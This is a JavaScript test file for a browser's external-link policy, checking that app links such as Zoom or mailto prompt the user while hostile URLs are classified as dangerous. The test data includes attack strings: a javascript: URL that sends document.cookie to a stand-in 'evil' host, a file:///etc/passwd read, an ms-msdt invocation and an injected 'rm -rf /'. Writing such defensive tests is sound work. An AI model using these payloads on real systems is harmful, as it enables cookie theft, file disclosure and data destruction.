// App-link policy: the deny-list is a security boundary (the browser must
// never become a launcher for local attack surface), the ask is a UX
// promise (a clicked Zoom link must not dead-end).
import test from 'node:test';
import assert from 'node:assert/strict';
import { schemeOf, classifyExternal, isRememberedScheme, appLabelForScheme } from '../../src/shared/external.js';

test('schemeOf reads the scheme, or refuses malformed input', () => {
  assert.equal(schemeOf('zoommtg://zoom.us/join?confno=1'), 'zoommtg');
  assert.equal(schemeOf('MAILTO:a@b.com'), 'mailto');
  assert.equal(schemeOf('ms-word:ofe|u|x'), 'ms-word');
  for (const bad of ['nocolon', ':leading', '', null, 42, '://x', '1abc://x', 'a b://x']) {
    assert.equal(schemeOf(/** @type {any} */ (bad)), null, `must refuse ${JSON.stringify(bad)}`);
  }
});

test('dangerous schemes are never offered to the user', () => {
  const attacks = [
    'file:///etc/passwd',
    'javascript:fetch("//evil/"+document.cookie)',
    'data:text/html,<h1>Sign in',
    'vbscript:msgbox(1)',
    'search-ms:query=passwords',
    'ms-msdt:/id PCWDiagnostic',
    'ms-appinstaller://?source=//evil/app.msix',
    'chrome://settings',
    'view-source:https://x.example/',
    'raha://app/index.html',
  ];
  for (const url of attacks) {
    assert.equal(classifyExternal(url), 'dangerous', `${url} must never be asked about`);
  }
});

test('real app links are askable', () => {
  for (const url of [
    'zoommtg://zoom.us/join?confno=12345',
    'msteams:/l/meetup-join/x',
    'mailto:someone@example.com?subject=hi',
    'tel:+15551234567',
    'slack://channel?id=C1',
    'vscode://file/tmp/x.js',
  ]) {
    assert.equal(classifyExternal(url), 'app', `${url} should prompt`);
  }
});

test('control characters and absurd lengths are refused', () => {
  assert.equal(classifyExternal('zoommtg://join\u0000; rm -rf /'), 'dangerous');
  assert.equal(classifyExternal('zoommtg://join\nX-Injected: 1'), 'dangerous');
  assert.equal(classifyExternal(`zoommtg://${'x'.repeat(3000)}`), 'dangerous');
});

test('remembered schemes only match exactly', () => {
  assert.equal(isRememberedScheme('zoommtg', ['zoommtg']), true);
  assert.equal(isRememberedScheme('zoommtg', ['zoom']), false);
  assert.equal(isRememberedScheme('zoommtg', undefined), false);
  assert.equal(isRememberedScheme(null, ['zoommtg']), false);
});

test('labels name known apps and never guess for unknown ones', () => {
  assert.equal(appLabelForScheme('zoommtg'), 'Zoom');
  assert.equal(appLabelForScheme('msteams'), 'Microsoft Teams');
  assert.match(appLabelForScheme('weirdapp'), /weirdapp/);
  assert.equal(appLabelForScheme(null), 'another app');
});
